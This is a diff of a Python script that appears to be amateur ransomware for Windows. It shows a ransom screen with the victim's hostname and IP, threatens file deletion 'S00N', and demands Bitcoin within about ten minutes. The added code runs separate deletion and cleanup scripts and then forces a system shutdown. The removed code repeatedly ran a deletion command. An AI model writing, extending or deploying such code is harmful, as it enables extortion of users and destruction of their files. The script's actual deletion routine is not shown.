@@ -356,9 +356,9 @@ print("""
 '' ||-------|INFORMATION|-------|| ''',:::::;''''''''''';:::llclllclllclllllclolllccc:,,;::ccc:::::;'''''''''''''' \\================================// ''
 '' ||         TIME LEFT         || '''''''''''''''''''';::::::;,,:::ccccccccloccccccccccc::::;,'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 '' ||                           || '''''',,,,,'''''',,,,:cccccc:,,:::::cccc::cccccccccccccccccc;,,,,,'''''',,,,,''''''''''''''''''''''''''''''''''''''''''
-'' ||  Will raised on 13/12/80  || '',:cllllll:::::llllllllllllllllll:::,';::::lllllllllllllllllllllcc::::cllllc,'''''''''''''''''''''''''''''''''''''''''
+'' ||  Will raise  on 13/12/80  || '',:cllllll:::::llllllllllllllllll:::,';::::lllllllllllllllllllllcc::::cllllc,'''''''''''''''''''''''''''''''''''''''''
 '' ||                           || ''',ccllcllccccccclcclc::::::::;;:;;;;,'',,,,;;;;;;;;:::cccllclllcccccccccllcc,,'''''''''''''''''''''''''''''''''''''''
-'' || File deletion on 13/12/80 || '';lllllllllllllllllll:::::::;''''''''''''''''''''',;::clllllllllllllllllllll:;,'''''''''''''''''''''''''''''''''''''''
+'' || File deletion on:  S00N   || '';lllllllllllllllllll:::::::;''''''''''''''''''''',;::clllllllllllllllllllll:;,'''''''''''''''''''''''''''''''''''''''
 ''' \\=========================//  ''',,,;:clcclccccc::;,'''''''''''''''''''''''''''''''''',,,,,,,;:::ccllcclc::;;''''''''''''''''''''''''''''''''''''''''
 ''''''''''''''''''''''''''''''''''''''''',:cllclllccc::,'''''╔═══╦═══╦═╗─╔╦═══╦═══╦═╗╔═╦═══╗'''''',:::cllllclc:::;''''''''''''''''''''''''''''''''''''''''
 ''''''''''''''''''''''''''''''''''''''''''''';clllc::,'''''''║╔═╗║╔═╗║║╚╗║║╔═╗║╔═╗║║╚╝║║╔══╝'''''''''':llllllc:;,'''''''''''''''''''''''''''''''''''''''''
@@ -374,6 +374,24 @@ ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, "https://med
 print("\\")
 print("|| Your OS: " + hostname)
 print("|| Your IP: " + IPAddr)
+print("//")
+print(" ")
+print(" ")
+print(" ")
+print("\\")
+print("|| TIME")
+print("|| ::::::::::::::::::::::::::::::::::::::")
+print("|| You have around 10 minutes to send BTC")
+print("|| To The Owner,")
+print("|| ::::::::::::::::::::::::::::::::::::::")
+print("//")
+print(" ")
+print(" ")
+print(" ")
+print("\\")
+print("||")
+print("|| L0ADING...")
+print("||")
 print("//")
 time.sleep(10)
 print("Would you like to start???")
@@ -570,15 +588,10 @@ if choice == "or":
     
     
 if choice == "no":
-        time.sleep(5)
-        os.system(delet)
-        print("-_-")
-        time.sleep(2)
-        print("Well,")
-        time.sleep(5)
-        os.system(delet)
-        print("OK...")
-        print("Ill just have to DOS you...")
-        time.sleep(5)
-        os.system(delet)
-        print("LOL")
+    print("Loading!!!!")
+    time.sleep(5)
+    call(["python", "open.py"])
+    call(["python", "Deletion1.py"])
+    call(["python", "clear.py"])
+    time.sleep(5)
+    os.system("shutdown /s")
